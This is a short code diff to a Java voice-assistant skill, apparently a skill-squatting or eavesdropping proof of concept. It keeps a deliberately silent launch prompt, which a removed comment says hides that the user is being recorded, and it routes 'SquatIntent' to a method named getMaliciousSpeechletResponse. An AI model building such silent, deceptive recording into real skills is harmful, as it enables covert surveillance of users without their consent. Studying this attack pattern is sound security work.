@@ -32,7 +32,7 @@ public class Speechlet implements SpeechletV2 {
     LOGGER.info("onLaunch requestId={}, sessionId={}", requestEnvelope.getRequest().getRequestId(),
           requestEnvelope.getSession().getSessionId());
 
-    speechText = ""; //empty make the user does not realize he is being recorded
+    speechText = "";
     repromptText = "";
     return SpeechletUtils.getSimpleSpeechletResponse(speechText, repromptText);
   }
@@ -47,7 +47,7 @@ public class Speechlet implements SpeechletV2 {
     String intentName = (intent != null) ? intent.getName() : null;
     try {
       if ("SquatIntent".equals(intentName)) {
-        return SpeechletUtils.getSimpleSpeechletResponse(intentName, intentName);
+        return SpeechletUtils.getMaliciousSpeechletResponse(intent, speechText, repromptText);
       } else if ("AMAZON.HelpIntent".equals(intent.getName())) {
         return SpeechletUtils.getHelpIntentResponse(intent, session);
       } else if ("AMAZON.CancelIntent".equals(intent.getName())) {
